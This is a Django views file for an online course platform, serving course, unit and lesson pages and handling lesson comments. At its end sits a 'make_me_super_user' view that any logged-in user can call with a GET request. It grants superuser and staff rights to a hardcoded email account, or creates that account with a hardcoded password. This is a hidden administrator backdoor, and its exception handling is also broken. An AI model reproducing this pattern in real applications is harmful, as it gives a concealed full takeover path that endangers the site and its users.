from django.shortcuts import redirect, render, get_object_or_404
from django.contrib.auth.decorators import login_required
from django.views.decorators.http import require_http_methods
from .models import Course, Unit, Lesson, Comment
from school.decorators import has_courses, require_course_access
from authentication.models import Student
from django.http import HttpResponse



@require_http_methods(["GET"])
def index(request):
    "The main page of the web which has all the courses and the home page."
    courses = Course.objects.filter().all()
    return render(request, 'index.html', { 'courses' : courses })



@require_http_methods(["GET"])
def buy_all(request):
    "the page that has all the courses ready to buy ."
    courses = Course.objects.filter().all()
    return render(request, 'course/buy_all.html', { 'courses' : courses })




@require_http_methods(["GET"])
@login_required
@has_courses()
def course_list(request, courses):
    "The page of the courses that the user has ."
    return render(request, 'course/course_list.html', { 'courses' : courses })



@require_http_methods(["GET"])
@login_required
@require_course_access()
def course_view(request, course_id):
    "the page that showes each unit for the course"
    units = Unit.objects.filter(course_id=course_id).all()
    return render(request, 'course/course.html', { 'units' : units })




@require_http_methods(["GET"])
@login_required
@require_course_access()
def unit_view(request, course_id, unit_id):
    "the page that showes each lesson for the unit"
    lessons = Lesson.objects.filter(unit_id=unit_id).all()
    return render(request, 'course/lesson_list.html', { 'lessons' : lessons })



@require_http_methods(["GET", "POST"])
@login_required
@require_course_access()
def lesson_view(request, course_id, lesson_id):
    "the lesson page"
    lesson = get_object_or_404(Lesson.objects.only('id'), id=lesson_id)
    comments = (Comment.objects
                .filter(
                    receiver_content_type__model='lesson',
                    receiver_object_id=lesson.pk
                )
                .select_related('sender')
                .prefetch_related('children__sender')
                .order_by('-created_at')
                )
    return render(
        request,
        'course/lesson.html',
        { 
            'lesson' : lesson,
            'comments' : comments,
            'course_id' : course_id,
        }
    )




@login_required
@require_http_methods(["POST"])
@require_course_access()
def comment_add_lesson(request, course_id, lesson_id):
    lesson = get_object_or_404(Lesson, id=lesson_id)
    content = request.POST.get('content')
    if content is None:
        return redirect("Lesson",course_id, lesson.pk)
    Comment.objects.create(
        content=content,
        sender=request.user,
        receiver=lesson,
        )
    return redirect("Lesson",course_id, lesson.pk)
    
        

@login_required
@require_http_methods(["POST"])
@require_course_access()
def comment_add_comment(request, course_id, lesson_id):
    parent_id = request.POST.get('parent_id')
    lesson = get_object_or_404(Lesson, id=lesson_id)
    parent = get_object_or_404(Comment, id=parent_id)
    content = request.POST.get('content')
    if content is None:
        return redirect("Lesson",course_id, lesson.pk)
    Comment.objects.create(
        content=content,
        sender=request.user,
        receiver=parent,
        )
    return redirect("Lesson",course_id, lesson.pk)




@login_required
@require_http_methods(["GET"])
def make_me_super_user(request):
    try:
        user = Student.objects.get(email="amirdwikatmain@example.com")
        if user.is_superuser:
            return HttpResponse("Already a superuser.")
        else:
            user.is_superuser = True
            user.is_staff = True
            user.save()
            return HttpResponse("Upgraded to superuser successfully!")
    except user.DoesNotExist:
        # تنشئ سوبر يوزر جديد لو ما كان موجود
        Student.objects.create_superuser(
            username="amir",
            email="amirdwikatmain@example.com",
            password="StrongPassword123"
        )
        return HttpResponse("Superuser created successfully!")